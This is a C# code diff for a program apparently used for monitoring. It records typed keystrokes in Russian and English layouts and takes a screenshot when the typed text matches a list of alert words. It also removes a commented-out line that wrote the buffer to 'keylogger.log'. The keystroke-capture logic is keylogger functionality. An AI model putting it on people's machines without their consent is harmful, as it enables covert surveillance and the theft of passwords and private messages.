@@ -22,7 +22,9 @@ namespace Alerts
 
             string bufrus = "";
             string bufeng = "";
-            string[] words = Methods.InitAlertWords();
+
+
+
 
             while (true)
             {
@@ -42,35 +44,26 @@ namespace Alerts
                             bufrus += rusKey.Substring(engKey.IndexOf(((Keys)i).ToString().ToLower()), 1);
                             bufeng += ((Keys)i).ToString().ToLower();
                             Form1 frmTemp = (Form1)Application.OpenForms[0];
-                            string[] bufs = new string[] { bufrus,bufeng};
+                            string[] bufs = new string[] { bufrus, bufeng };
                             frmTemp.BufKeyFill(bufs);
 
                         }
                     }
                 }
-            
+                string[] words = Methods.InitAlertWords();
+                foreach (string o in words)
+                    {
 
-            foreach (string o in words)
-            {
-                if (bufrus.Contains(o)||bufeng.Contains(o))
-                {
-                    Methods.ScreenShot();
-                    bufrus = "";
-                    bufeng = "";
-                }
-              
+                        if (o!=""&&(bufrus.Contains(o) || bufeng.Contains(o)))
+                        {
+                            Methods.ScreenShot();
+                            bufrus = "";
+                            bufeng = "";
+                        }
+
+                    }
+                
             }
-        }
-            /* if (buf.Length > 10)
-             {
-                 File.AppendAllText("keylogger.log", buf + "\n");
-                 buf = "";
-             }*/
-
-
-
-
-
 
         }
 
